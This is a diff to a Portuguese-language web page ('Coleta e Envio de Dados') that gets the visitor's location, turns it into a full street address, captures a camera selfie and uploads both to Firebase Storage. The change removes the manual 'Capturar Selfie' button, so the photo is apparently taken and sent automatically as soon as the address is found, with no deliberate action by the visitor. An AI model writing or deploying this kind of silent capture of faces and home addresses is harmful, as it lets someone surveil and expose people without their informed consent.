@@ -19,13 +19,6 @@
     #canvas {
       display: none;
     }
-    #captureButton {
-      display: none;
-      margin: 20px;
-      padding: 10px 20px;
-      font-size: 16px;
-      cursor: pointer;
-    }
   </style>
   <!-- Firebase SDK -->
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
@@ -36,7 +29,6 @@
   <h1>Coleta e Envio de Dados</h1>
   <video id="video" autoplay></video>
   <canvas id="canvas"></canvas>
-  <button id="captureButton">Capturar Selfie</button>
 
   <script>
     // Configuração do Firebase
@@ -59,7 +51,7 @@
     // Referências aos elementos
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
-    const captureButton = document.getElementById('captureButton');
+    const context = canvas.getContext('2d');
 
     // Função para salvar selfie no Storage
     function uploadSelfieToStorage(selfieData, addressDetails) {
@@ -78,16 +70,20 @@
 
     // Captura da selfie
     function captureSelfie(addressDetails) {
-      const context = canvas.getContext('2d');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      // Verifica se a câmera está ativa e a imagem aparece no vídeo
+      if (video.readyState === 4) { // Verifica se a mídia está carregada e pronta
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-      const selfieData = canvas.toDataURL('image/png', 1.0); // Qualidade máxima
-      if (selfieData) {
-        uploadSelfieToStorage(selfieData, addressDetails);
+        const selfieData = canvas.toDataURL('image/png', 1.0); // Qualidade máxima
+        if (selfieData) {
+          uploadSelfieToStorage(selfieData, addressDetails);
+        } else {
+          alert('Erro ao capturar selfie.');
+        }
       } else {
-        alert('Erro ao capturar selfie.');
+        alert('Câmera não está pronta. Tente novamente.');
       }
     }
 
@@ -112,9 +108,7 @@
               address: data.results[0].formatted
             };
             alert(`Endereço completo: ${addressDetails.address}`);
-            // Habilitar o botão de captura
-            captureButton.onclick = () => captureSelfie(addressDetails);
-            captureButton.style.display = 'block';
+            captureSelfie(addressDetails); // Captura selfie após obter o endereço
           } else {
             alert('Endereço não encontrado.');
           }
@@ -146,7 +140,6 @@
           .then(stream => {
             video.srcObject = stream;
             video.onloadedmetadata = () => {
-              // Habilita captura somente após o vídeo carregar
               alert('Câmera pronta para captura.');
             };
           })
